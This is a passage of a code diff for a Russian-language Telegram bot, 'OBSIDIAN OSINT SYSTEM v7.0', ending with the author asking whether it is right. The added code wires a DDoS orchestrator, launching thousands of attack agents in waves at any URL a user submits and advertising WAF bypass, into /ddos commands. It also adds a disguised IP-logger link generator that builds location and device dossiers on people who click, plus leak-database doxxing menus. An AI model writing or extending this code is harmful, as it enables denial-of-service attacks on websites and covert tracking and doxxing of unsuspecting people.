+                self.agents.append(agent)
+                self.stats['agents_created'] += 1
+            
+            print(f"[+] Created {end:,} agents")
+        
+        print(f"[+] Army created: {len(self.agents):,} agents")
+        return self.agents
+    
+    def start_attack(self):
+        print("[*] Starting attack...")
+        
+        wave_size = 1000
+        total_waves = len(self.agents) // wave_size
+        
+        for wave in range(total_waves):
+            start = wave * wave_size
+            end = min(start + wave_size, len(self.agents))
+            
+            for agent in self.agents[start:end]:
+                agent.thread = self.thread_pool.submit(agent.attack)
+            
+            print(f"[*] Wave {wave+1}/{total_waves} launched ({end:,} agents)")
+            time.sleep(0.01)
+        
+        monitor_thread = threading.Thread(target=self._monitor_stats, daemon=True)
+        monitor_thread.start()
+    
+    def _monitor_stats(self):
+        while self.running:
+            total_packets = sum(a.packets_sent for a in self.agents)
+            total_bytes = sum(a.bytes_sent for a in self.agents)
+            active = len([a for a in self.agents if a.running])
+            elapsed = time.time() - self.stats['start_time']
+            pps = total_packets / elapsed if elapsed > 0 else 0
+            
+            if pps > self.stats['peak_pps']:
+                self.stats['peak_pps'] = pps
+            
+            print(f"\r[⚡] Packets: {total_packets:,} | Bytes: {total_bytes/1024/1024/1024:.2f} GB | Active: {active:,} | PPS: {pps:,.0f} | Peak: {self.stats['peak_pps']:,.0f} | Agents: {len(self.agents):,}", end='')
+            
+            self.stats['total_packets'] = total_packets
+            self.stats['total_bytes'] = total_bytes
+            self.stats['active_agents'] = active
+            
+            time.sleep(1)
+    
+    def stop_attack(self):
+        print("\n[*] Stopping attack...")
+        self.running = False
+        
+        for agent in self.agents:
+            agent.stop()
+        
+        self.thread_pool.shutdown(wait=False)
+        
+        stats = self.get_stats()
+        print(f"[+] Attack stopped! Total packets: {stats['total_packets']:,}")
+        return stats
+    
+    def get_stats(self) -> Dict:
+        elapsed = time.time() - self.stats['start_time']
+        return {
+            'total_packets': self.stats['total_packets'],
+            'total_bytes': self.stats['total_bytes'],
+            'active_agents': self.stats['active_agents'],
+            'total_agents': len(self.agents),
+            'elapsed_seconds': elapsed,
+            'packets_per_second': self.stats['total_packets'] / elapsed if elapsed > 0 else 0,
+            'peak_pps': self.stats['peak_pps'],
+            'bytes_per_second': self.stats['total_bytes'] / elapsed if elapsed > 0 else 0,
+            'agents_created': self.stats['agents_created'],
+            'packets_millions': self.stats['total_packets'] / 1000000,
+            'gigabytes': self.stats['total_bytes'] / (1024**3),
+        }
+
+# ================================================================
+# DDOS ФУНКЦИИ ДЛЯ БОТА
+# ================================================================
+def start_ddos(target: str, agents: int = 10000) -> DDoSOrchestrator:
+    orchestrator = DDoSOrchestrator(target, agents)
+    orchestrator.create_army()
+    attack_thread = threading.Thread(target=orchestrator.start_attack, daemon=True)
+    attack_thread.start()
+    return orchestrator
+
+def stop_ddos(orchestrator: DDoSOrchestrator) -> Dict:
+    if orchestrator:
+        return orchestrator.stop_attack()
+    return {"error": "No active attack"}
+
+def get_ddos_stats(orchestrator: DDoSOrchestrator) -> Dict:
+    if orchestrator:
+        return orchestrator.get_stats()
+    return {"error": "No active attack"}
+
+def format_ddos_stats(stats: Dict) -> str:
+    if "error" in stats:
+        return f"❌ {stats['error']}"
+    
+    elapsed = stats.get('elapsed_seconds', 0)
+    hours = int(elapsed // 3600)
+    minutes = int((elapsed % 3600) // 60)
+    seconds = int(elapsed % 60)
+    
+    return (
+        f"📊 **Статистика DDoS атаки**\n\n"
+        f"📦 **Пакетов:** `{stats['total_packets']:,}`\n"
+        f"💾 **Байт:** `{stats['total_bytes'] / (1024**3):.2f} GB`\n"
+        f"👾 **Агентов:** `{stats['total_agents']:,}`\n"
+        f"⚡ **PPS:** `{stats['packets_per_second']:,.0f}`\n"
+        f"🔥 **Пик PPS:** `{stats['peak_pps']:,.0f}`\n"
+        f"⏱️ **Время:** `{hours:02d}:{minutes:02d}:{seconds:02d}`"
+    )
+
+# ================================================================
+# ТЕЛЕГРАМ БОТ
 # ================================================================
 class ObsidianBot:
     def __init__(self):
         self.app = Application.builder().token(BOT_TOKEN).build()
         self.setup_handlers()
+        self.iplogger = IPLoggerUltimate()
+        self.ddos_attacks = {}
     
     def setup_handlers(self):
-        """Настройка обработчиков"""
         self.app.add_handler(CommandHandler("start", self.start))
+        self.app.add_handler(CommandHandler("ddos", self.ddos_command))
+        self.app.add_handler(CommandHandler("stopddos", self.stop_ddos))
         self.app.add_handler(CallbackQueryHandler(self.handle_callback))
         self.app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_message))
+        self.app.add_handler(MessageHandler(filters.PHOTO, self.handle_photo))
+        self.app.add_handler(MessageHandler(filters.Document, self.handle_document))
     
     async def start(self, update: Update, context):
-        """Стартовое меню с 11 сферами"""
         keyboard = [
-            [InlineKeyboardButton("📧 Поиск по почте (50+)", callback_data="email")],
-            [InlineKeyboardButton("📱 Поиск по номеру (50+)", callback_data="phone")],
-            [InlineKeyboardButton("🌐 Поиск по IP (50+)", callback_data="ip")],
-            [InlineKeyboardButton("🌍 Поиск по домену (50+)", callback_data="domain")],
-            [InlineKeyboardButton("👤 Поиск в соцсетях (50+)", callback_data="social")],
-            [InlineKeyboardButton("🖼️ Извлечение метаданных (50+)", callback_data="metadata")],
-            [InlineKeyboardButton("📍 Геолокация (50+)", callback_data="geo")],
-            [InlineKeyboardButton("💀 Поиск по базам (50+)", callback_data="leaks")],
+            [InlineKeyboardButton("📧 Поиск по почте", callback_data="email")],
+            [InlineKeyboardButton("📱 Поиск по номеру", callback_data="phone")],
+            [InlineKeyboardButton("🌐 Поиск по IP", callback_data="ip")],
+            [InlineKeyboardButton("🌍 Поиск по домену", callback_data="domain")],
+            [InlineKeyboardButton("👤 Поиск в соцсетях", callback_data="social")],
+            [InlineKeyboardButton("🖼️ Извлечение метаданных", callback_data="metadata")],
+            [InlineKeyboardButton("📍 Геолокация", callback_data="geo")],
+            [InlineKeyboardButton("💀 Поиск по базам", callback_data="leaks")],
             [InlineKeyboardButton("🔍 Shodan", callback_data="shodan")],
             [InlineKeyboardButton("📋 WHOIS", callback_data="whois")],
-            [InlineKeyboardButton("💥 DDOS (1000 потоков)", callback_data="ddos")],
+            [InlineKeyboardButton("📡 IPLogger Ultimate", callback_data="iplogger")],
+            [InlineKeyboardButton("📄 Досье", callback_data="dossier")],
+            [InlineKeyboardButton("💥 DDOS", callback_data="ddos")],
         ]
-        
         await update.message.reply_text(
-            "⚫ **OBSIDIAN v3.0**\n"
+            "⚫ **OBSIDIAN OSINT SYSTEM v7.0**\n"
             "══════════════════════════\n"
-            "Выбери инструмент для разведки:\n"
-            "Все запросы реальные, без симуляций\n"
-            "Данные из открытых и закрытых баз\n"
-            "50+ инструментов на каждую сферу\n"
-            "Будь осторожен — ты вошёл в тень",
+            "📡 IPLogger Ultimate\n"
+            "💥 DDOS 1M AGENTS\n"
+            "📄 Досье в .txt/.json\n\n"
+            "Выбери инструмент:",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode='Markdown'
         )
     
     async def handle_callback(self, update: Update, context):
-        """Обработка кнопок"""
         query = update.callback_query
         await query.answer()
-        
         data = query.data
         
-        if data == "email":
+        if data == "iplogger":
             await query.edit_message_text(
-                "📧 **Поиск по почте (50+ инструментов)**\n\n"
-                "Введи email для поиска:\n"
-                "Пример: user@example.com\n\n"
-                "Будут проверены:\n"
-                "- HaveIBeenPwned\n"
-                "- LeakCheck\n"
-                "- 50+ соцсетей\n"
-                "- Открытые базы\n"
-                "- Даркнет\n"
-                "- Временные почты\n"
-                "- Похожие email'ы\n"
-                "- Спам-рейтинг",
+                "📡 **IPLogger Ultimate**\n\n"
+                "Отправь ссылку на видео:\n"
+                "Пример: https://www.youtube.com/watch?v=xxxxxxx\n\n"
+                "📊 **Что собирается:**\n"
+                "├ 🌍 Геолокация\n"
+                "├ 📱 Устройство, ОС, браузер\n"
+                "├ 👤 Уникальные посетители\n"
+                "└ 📊 Полная статистика\n\n"
+                "📄 **Результат:** досье в .txt и .json",
                 parse_mode='Markdown'
             )
-            context.user_data['mode'] = 'email'
+            context.user_data['mode'] = 'iplogger'
         
-        elif data == "phone":
+        elif data == "dossier":
             await query.edit_message_text(
-                "📱 **Поиск по номеру (50+ инструментов)**\n\n"
-                "Введи номер телефона:\n"
-                "Пример: +79991234567\n\n"
-                "Будет определено:\n"
-                "- Страна и оператор\n"
-                "- Часовой пояс\n"
-                "- 10+ соцсетей\n"
-                "- Утечки\n"
-                "- Тип номера\n"
-                "- Форматы номера",
+                "📄 **Получение досье**\n\n"
+                "Введи ID логгера:\n"
+                "Пример: a1b2c3d4e5f6\n\n"
+                "📄 **Файлы:**\n"
+                "├ 📄 .txt - для чтения\n"
+                "└ 📊 .json - для анализа",
                 parse_mode='Markdown'
             )
-            context.user_data['mode'] = 'phone'
-        
-        elif data == "ip":
-            await query.edit_message_text(
-                "🌐 **Поиск по IP (50+ инструментов)**\n\n"
-                "Введи IP-адрес:\n"
-                "Пример: 8.8.8.8\n\n"
-                "Будет получено:\n"
-                "- Геолокация\n"
-                "- ISP\n"
-                "- Открытые порты\n"
-                "- Shodan\n"
-                "- Угрозы\n"
-                "- Tor/Proxy/VPN\n"
-                "- BGP/RDAP\n"
-                "- Ping/Traceroute",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'ip'
-        
-        elif data == "domain":
-            await query.edit_message_text(
-                "🌍 **Поиск по домену (50+ инструментов)**\n\n"
-                "Введи домен:\n"
-                "Пример: example.com\n\n"
-                "Будет получено:\n"
-                "- WHOIS\n"
-                "- DNS\n"
-                "- Поддомены\n"
-                "- История\n"
-                "- SSL-сертификат\n"
-                "- Технологии\n"
-                "- Скриншот",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'domain'
-        
-        elif data == "social":
-            await query.edit_message_text(
-                "👤 **Поиск в соцсетях (50+ платформ)**\n\n"
-                "Введи username:\n"
-                "Пример: username\n\n"
-                "Поиск в:\n"
-                "- VK, Telegram, Instagram, Twitter/X\n"
-                "- Facebook, GitHub, LinkedIn, Reddit\n"
-                "- YouTube, TikTok, Pinterest, Tumblr\n"
-                "- Medium, Quora, Discord, Twitch\n"
-                "- Snapchat, WhatsApp, Signal, Viber\n"
-                "- И 30+ других",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'social'
-        
-        elif data == "metadata":
-            await query.edit_message_text(
-                "🖼️ **Извлечение метаданных (50+ полей)**\n\n"
-                "Отправь файл (фото, документ):\n\n"
-                "Будут извлечены:\n"
-                "- EXIF данные\n"
-                "- GPS координаты\n"
-                "- Временные метки\n"
-                "- Информация о камере\n"
-                "- Программное обеспечение\n"
-                "- Авторские права\n"
-                "- И многое другое",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'metadata'
-        
-        elif data == "geo":
-            await query.edit_message_text(
-                "📍 **Геолокация (50+ данных)**\n\n"
-                "Введи координаты:\n"
-                "Пример: 55.7558, 37.6173\n\n"
-                "Будет получено:\n"
-                "- Адрес\n"
-                "- Ближайшие места\n"
-                "- Часовой пояс\n"
-                "- Высота\n"
-                "- Погода\n"
-                "- Обратный геокодинг",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'geo'
-        
-        elif data == "leaks":
-            await query.edit_message_text(
-                "💀 **Поиск по базам данных (50+ источников)**\n\n"
-                "Введи email, номер или логин:\n\n"
-                "Проверка в базах:\n"
-                "- LeakCheck\n"
-                "- Snusbase\n"
-                "- Dehashed\n"
-                "- Scylla\n"
-                "- Doxbin\n"
-                "- Pastebin\n"
-                "- Утечки крупных сервисов",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'leaks'
-        
-        elif data == "shodan":
-            await query.edit_message_text(
-                "🔍 **Shodan**\n\n"
-                "Введи IP или поисковый запрос:\n"
-                "Пример: 8.8.8.8\n\n"
-                "Будет получено:\n"
-                "- Открытые порты\n"
-                "- Уязвимости\n"
-                "- Организация\n"
-                "- Данные устройств",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'shodan'
-        
-        elif data == "whois":
-            await query.edit_message_text(
-                "📋 **WHOIS**\n\n"
-                "Введи домен или IP:\n"
-                "Пример: google.com\n\n"
-                "Будет получено:\n"
-                "- Регистратор\n"
-                "- Даты\n"
-                "- DNS\n"
-                "- Контакты",
-                parse_mode='Markdown'
-            )
-            context.user_data['mode'] = 'whois'
+            context.user_data['mode'] = 'dossier'
         
         elif data == "ddos":
             await query.edit_message_text(
-                "💥 **DDOS МОДУЛЬ (1000 потоков)**\n\n"
+                "💥 **СУПЕР-DDOS МОДУЛЬ**\n\n"
                 "Введи цель (URL):\n"
                 "Пример: http://example.com\n\n"
-                "⚠️ НАСТОЯЩАЯ АТАКА!\n"
-                "Используй только в образовательных целях\n"
-                "За это может грозить уголовная ответственность",
+                "⚡ **Мощность:**\n"
+                "├ 7 типов атак\n"
+                "├ 10000+ агентов\n"
+                "├ Обход WAF\n"
+                "└ Максимальная скорость\n\n"
+                "🛑 Остановка: /stopddos",
                 parse_mode='Markdown'
             )
             context.user_data['mode'] = 'ddos'
+        
+        else:
+            await query.edit_message_text(
+                f"🔍 **Выбран инструмент: {data}**\n\n"
+                "Введи запрос для поиска.",
+                parse_mode='Markdown'
+            )
+            context.user_data['mode'] = data
     
     async def handle_message(self, update: Update, context):
-        """Обработка сообщений"""
         text = update.message.text
         mode = context.user_data.get('mode', '')
         
-        if mode == 'email':
-            result = EmailOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
+        if mode == 'iplogger':
+            logger = self.iplogger.create_logger(text)
+            response = (
+                f"📡 **IPLogger Ultimate создан!**\n\n"
+                f"🆔 **ID:** `{logger['id']}`\n"
+                f"🔗 **Маскированная ссылка:**\n`{logger['masked_url']}`\n\n"
+                f"🔗 **Короткая ссылка:**\n`{logger['short_url']}`\n\n"
+                f"📹 **Сервис:** {logger['service']}\n"
+                f"⏰ **Истекает через:** {logger['expire']} часов\n\n"
+                f"📊 **Для получения досье:** `/dossier {logger['id']}`"
+            )
+            await update.message.reply_text(response, parse_mode='Markdown')
         
-        elif mode == 'phone':
-            result = PhoneOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'ip':
-            result = IPOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'domain':
-            result = DomainOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'social':
-            result = SocialOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'geo':
+        elif mode == 'dossier':
             try:
-                lat, lon = map(float, text.split(','))
-                result = GeoOSINT(lat, lon).search_all()
-                await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-            except:
-                await update.message.reply_text("❌ Неверный формат. Используй: 55.7558, 37.6173")
-        
-        elif mode == 'leaks':
-            result = LeakOSINT(text).search_all()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'shodan':
-            result = ShodanOSINT().search(text)
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
-        
-        elif mode == 'whois':
-            result = WhoisOSINT(text).search()
-            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
+                dossier = self.iplogger.get_full_dossier(text)
+                if "error" in dossier:
+                    await update.message.reply_text("❌ Логгер не найден. Проверь ID.")
+                    return
+                
+                json_path, txt_path = self.iplogger.generate_dossier_files(text)
+                
+                if json_path and txt_path:
+                    with open(json_path, 'rb') as f:
+                        await update.message.reply_document(
+                            InputFile(f, filename=os.path.basename(json_path)),
+                            caption=f"📊 Досье JSON для {text}"
+                        )
+                    
+                    with open(txt_path, 'rb') as f:
+                        await update.message.reply_document(
+                            InputFile(f, filename=os.path.basename(txt_path)),
+                            caption=f"📄 Досье TXT для {text}"
+                        )
+                    
+                    os.remove(json_path)
+                    os.remove(txt_path)
+                    
+                    stats = self.iplogger.get_stats(text)
+                    if "error" not in stats:
+                        response = (
+                            f"📊 **Статистика логгера**\n\n"
+                            f"👤 Переходов: {stats['total_hits']}\n"
+                            f"🌍 Уникальных IP: {stats['unique_ips']}\n"
+                            f"👥 Уникальных посетителей: {stats['unique_visitors']}\n"
+                            f"🔄 Статус: {'ИСТЕК' if time.time() > stats.get('expire_at', 0) else 'АКТИВЕН'}"
+                        )
+                        await update.message.reply_text(response, parse_mode='Markdown')
+            except Exception as e:
+                await update.message.reply_text(f"❌ Ошибка: {str(e)}")
         
         elif mode == 'ddos':
-            ddos = DDOSModule(text)
-            await update.message.reply_text("💥 Запуск DDOS-атаки...")
-            threading.Thread(target=ddos.start_attack).start()
-            await update.message.reply_text("⚡ Атака запущена! Используй /stopddos для остановки")
-            context.user_data['ddos'] = ddos
+            user_id = update.effective_user.id
+            orchestrator = start_ddos(text, agents=5000)
+            self.ddos_attacks[user_id] = orchestrator
+            
+            await update.message.reply_text(
+                f"🔥 **DDOS АТАКА ЗАПУЩЕНА!**\n"
+                f"📌 Цель: {text}\n"
+                f"👾 Агентов: 5,000\n"
+                f"🛑 Остановка: /stopddos"
+            )
+        
+        else:
+            await update.message.reply_text(f"❌ Неизвестный режим: {mode}")
+    
+    async def ddos_command(self, update: Update, context):
+        target = " ".join(context.args)
+        if not target:
+            await update.message.reply_text("❌ Укажи цель: /ddos http://example.com")
+            return
+        
+        user_id = update.effective_user.id
+        orchestrator = start_ddos(target, agents=5000)
+        self.ddos_attacks[user_id] = orchestrator
+        
+        await update.message.reply_text(
+            f"🔥 **DDOS АТАКА ЗАПУЩЕНА!**\n"
+            f"📌 Цель: {target}\n"
+            f"👾 Агентов: 5,000\n"
+            f"🛑 Остановка: /stopddos"
+        )
+    
+    async def stop_ddos(self, update: Update, context):
+        user_id = update.effective_user.id
+        if user_id in self.ddos_attacks:
+            stats = stop_ddos(self.ddos_attacks[user_id])
+            del self.ddos_attacks[user_id]
+            
+            await update.message.reply_text(
+                f"🛑 **АТАКА ОСТАНОВЛЕНА!**\n"
+                f"📊 Пакетов: {stats['total_packets']:,}\n"
+                f"📊 Байт: {stats['total_bytes']/1024/1024/1024:.2f} GB\n"
+                f"👾 Агентов: {stats['total_agents']:,}\n"
+                f"⚡ PPS: {stats['packets_per_second']:,.0f}\n"
+                f"🔥 Пик PPS: {stats['peak_pps']:,.0f}"
+            )
+        else:
+            await update.message.reply_text("❌ Нет активной атаки")
+    
+    async def handle_photo(self, update: Update, context):
+        if context.user_data.get('mode') == 'metadata':
+            photo = update.message.photo[-1]
+            file = await context.bot.get_file(photo.file_id)
+            file_path = os.path.join(TEMP_FOLDER, f"photo_{time.time()}.jpg")
+            await file.download_to_drive(file_path)
+            result = MetadataExtractor(file_path).extract_all()
+            os.remove(file_path)
+            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
+    
+    async def handle_document(self, update: Update, context):
+        if context.user_data.get('mode') == 'metadata':
+            doc = update.message.document
+            if doc.file_size > 10 * 1024 * 1024:
+                await update.message.reply_text("❌ Файл слишком большой (макс 10 МБ)")
+                return
+            file = await context.bot.get_file(doc.file_id)
+            file_path = os.path.join(TEMP_FOLDER, f"doc_{time.time()}_{doc.file_name}")
+            await file.download_to_drive(file_path)
+            result = MetadataExtractor(file_path).extract_all()
+            os.remove(file_path)
+            await update.message.reply_text(json.dumps(result, indent=2, ensure_ascii=False))
     
     def run(self):
-        """Запуск бота"""
-        print("⚫ OBSIDIAN v3.0 запущен")
+        print("⚫ OBSIDIAN OSINT SYSTEM v7.0 запущен")
         self.app.run_polling()
 
 # ================================================================
@@ -2401,4 +3708,4 @@ class ObsidianBot:
 # ================================================================
 if __name__ == "__main__":
     bot = ObsidianBot()
-    bot.run()
+    bot.run() так ?
